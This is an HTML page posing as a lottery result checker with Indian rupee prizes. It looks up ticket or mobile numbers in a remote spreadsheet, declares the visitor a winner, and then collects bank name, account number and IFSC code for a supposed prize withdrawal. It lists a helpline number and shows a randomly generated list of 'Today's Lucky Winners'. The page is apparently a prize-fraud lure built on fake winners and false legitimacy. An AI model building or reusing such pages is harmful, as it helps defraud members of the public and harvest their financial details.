<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Customer Status Verification</title>
  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
  <style>
    body { font-family: sans-serif; background: linear-gradient(135deg, #091921, #13334c, #1a506b); min-height: 100vh; margin: 0; padding: 15px; display: flex; flex-direction: column; align-items: center; color: #333; }
    .box { background: #fff; padding: 20px; border-radius: 12px; width: 100%; max-width: 420px; box-sizing: border-box; margin-bottom: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.3); }
    .text-center { text-align: center; }
    .live-dot { width: 10px; height: 10px; background: #ff1744; border-radius: 50%; display: inline-block; box-shadow: 0 0 8px #ff1744; margin-right: 5px; }
    input { width: 100%; padding: 11px; margin: 8px 0 14px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; outline: none; }
    button { width: 100%; padding: 12px; background: #1a73e8; color: #fff; border: none; border-radius: 6px; font-weight: bold; font-size: 15px; cursor: pointer; }
    .btn-green { background: #16a34a; margin-top: 10px; }
    .btn-back { background: transparent; color: #555; border: 1px solid #ccc; margin-top: 8px; }
    .row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #eee; font-size: 14px; }
    .badges { display: flex; flex-wrap: wrap; gap: 4px; max-height: 80px; overflow-y: auto; }
    .badge { background: #f1f5f9; padding: 2px 5px; border-radius: 4px; font-size: 11px; font-family: monospace; border: 1px solid #e2e8f0; }
  </style>
</head>
<body>

  <!-- STEP 1: Search -->
  <div id="step1" class="box text-center">
    <div id="clock" style="color: #1a73e8; font-weight: bold; font-size: 13px;">🕒 Time</div>
    <div style="font-size: 13px; margin: 6px 0;">Helpline: <a href="tel:8709171965" style="color: #e11d48; font-weight: bold; text-decoration: none;">8709171965</a></div>
    <h3 style="margin: 10px 0;"><span class="live-dot"></span>Live Result Check</h3>
    <input type="text" id="userInput" placeholder="Ticket Number / Mobile Number">
    <button onclick="checkResult()">Check Status</button>
    <div id="msg" style="color: #e11d48; font-size: 13px; margin-top: 8px; font-weight: bold;"></div>
  </div>

  <!-- STEP 2: Celebration -->
  <div id="step2" class="box text-center" style="display: none; border-top: 4px solid #f59e0b;">
    <h2 style="color: #b45309; margin: 5px 0;">🎉 Congratulations! 🎉</h2>
    <div style="text-align: left; margin: 12px 0;">
      <div class="row"><span>Ticket Number:</span><b id="winTicket" style="color: #1a73e8; font-family: monospace;"></b></div>
      <div class="row"><span>Customer Name:</span><b id="winName"></b></div>
      <div class="row"><span>Mobile Number:</span><b id="winMobile"></b></div>
      <div class="row"><span>Winning Prize:</span><b id="winPrize" style="color: #16a34a; font-size: 18px;"></b></div>
    </div>
    <button class="btn-green" onclick="showStep(3)">Withdraw Winning Amount</button>
    <button class="btn-back" onclick="showStep(1)">← Back</button>
  </div>

  <!-- STEP 3: Form -->
  <div id="step3" class="box" style="display: none; border-top: 4px solid #16a34a;">
    <h3 class="text-center" style="color: #16a34a; margin-top: 0;">Bank Withdrawal Details</h3>
    <label style="font-size: 12px; font-weight: bold;">Bank Name</label>
    <input type="text" id="bankName" placeholder="Bank Name">
    <label style="font-size: 12px; font-weight: bold;">Account Number</label>
    <input type="text" id="bankAcc" placeholder="Account Number">
    <label style="font-size: 12px; font-weight: bold;">IFSC Code</label>
    <input type="text" id="bankIfsc" placeholder="IFSC Code" style="text-transform: uppercase;">
    <button class="btn-green" onclick="submitBank()">Submit Withdrawal Request</button>
    <button class="btn-back" onclick="showStep(2)">← Back</button>
  </div>

  <!-- STEP 4: Under Review -->
  <div id="step4" class="box text-center" style="display: none; border-top: 4px solid #d97706;">
    <div style="font-size: 35px;">⏳</div>
    <h3 style="color: #b45309; margin: 5px 0;">Request Under Review</h3>
    <div style="text-align: left; margin: 12px 0;">
      <div class="row"><span>Ticket Number:</span><b id="revTicket" style="color: #1a73e8; font-family: monospace;"></b></div>
      <div class="row"><span>Holder Name:</span><b id="revName"></b></div>
      <div class="row"><span>Bank:</span><b id="revBank"></b></div>
      <div class="row"><span>Account No:</span><b id="revAcc" style="letter-spacing: 1px;"></b></div>
      <div class="row"><span>IFSC:</span><b id="revIfsc"></b></div>
      <div class="row"><span>Prize Amount:</span><b id="revPrize" style="color: #16a34a;"></b></div>
      <div class="row"><span>Status:</span><b style="color: #d97706;">Pending Approval</b></div>
    </div>
    <button class="btn-back" onclick="showStep(1)">← Check Another</button>
  </div>

  <!-- 1st to 10th Winners -->
  <div class="box" style="border-top: 4px solid #3b82f6;">
    <h4 class="text-center" style="color: #dc2626; margin: 0 0 10px;">🏆 Today's Lucky Winners 🏆</h4>
    <div id="winnersList"></div>
  </div>

  <script>
    setInterval(() => { document.getElementById('clock').textContent = '🕒 ' + new Date().toLocaleString('en-IN'); }, 1000);

    const fullPrizes = [
      ["1st Prize: ₹25 Crore", 1], ["2nd Prize: ₹10 Crore", 1], ["3rd Prize: ₹75 Lakh", 1],
      ["4th Prize: ₹25 Lakh", 12], ["5th Prize: ₹12 Lakh", 16], ["6th Prize: ₹1 Lakh", 36],
      ["7th Prize: ₹75,000", 99], ["8th Prize: ₹25,000", 120], ["9th Prize: ₹10,000", 179], ["10th Prize: ₹2,500", 200]
    ];
    let winHtml = "";
    fullPrizes.forEach(p => {
      let b = "";
      for (let i = 0; i < p[1]; i++) b += `<span class="badge">KL ${Math.floor(100000 + Math.random() * 900000)}</span>`;
      winHtml += `<div style="margin-bottom: 6px;"><div class="row"><b>${p[0]}</b><span>(${p[1]})</span></div><div class="badges">${b}</div></div>`;
    });
    document.getElementById("winnersList").innerHTML = winHtml;

    function showStep(n) {
      ['step1','step2','step3','step4'].forEach((id, i) => { document.getElementById(id).style.display = (i + 1 === n) ? 'block' : 'none'; });
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    let curData = {};
    async function checkResult() {
      const q = document.getElementById("userInput").value.trim().toLowerCase();
      const msg = document.getElementById("msg");
      if (!q) { msg.textContent = "Please enter ticket/mobile number."; return; }
      msg.textContent = "Searching...";

      try {
        const res = await fetch("https://sheetdb.io/api/v1/u2lswkzde626d");
        const data = await res.json();
        const record = data.find(r => Object.values(r).some(v => String(v).trim().toLowerCase() === q));

        if (record) {
          msg.textContent = "";
          curData = {
            ticket: record.ticket || record.Ticket || record.ticket_no || ("KL " + Math.floor(100000 + Math.random() * 900000)),
            name: record.name || record.Name || "Customer",
            mobile: record.mobile || record.Mobile || q,
            prize: record.amount || record.Amount || "₹25,00,000"
          };
          if (!curData.prize.includes("₹")) curData.prize = "₹" + curData.prize;

          document.getElementById("winTicket").textContent = curData.ticket;
          document.getElementById("winName").textContent = curData.name;
          document.getElementById("winMobile").textContent = curData.mobile;
          document.getElementById("winPrize").textContent = curData.prize;

          showStep(2);
          confetti({ particleCount: 70, spread: 60, origin: { y: 0.6 } });
        } else {
          msg.textContent = "No record found. Please verify number.";
        }
      } catch (e) {
        msg.textContent = "Database connection error.";
      }
    }

    function submitBank() {
      const bank = document.getElementById("bankName").value.trim();
      const acc = document.getElementById("bankAcc").value.trim();
      const ifsc = document.getElementById("bankIfsc").value.trim().toUpperCase();

      if (!bank || !acc || !ifsc) { alert("Please fill all details."); return; }

      document.getElementById("revTicket").textContent = curData.ticket || "-";
      document.getElementById("revName").textContent = curData.name || "-";
      document.getElementById("revBank").textContent = bank;
      document.getElementById("revAcc").textContent = acc.length > 4 ? "XXXX-XXXX-" + acc.slice(-4) : acc;
      document.getElementById("revIfsc").textContent = ifsc;
      document.getElementById("revPrize").textContent = curData.prize || "-";

      showStep(4);
    }
  </script>
</body>
</html>
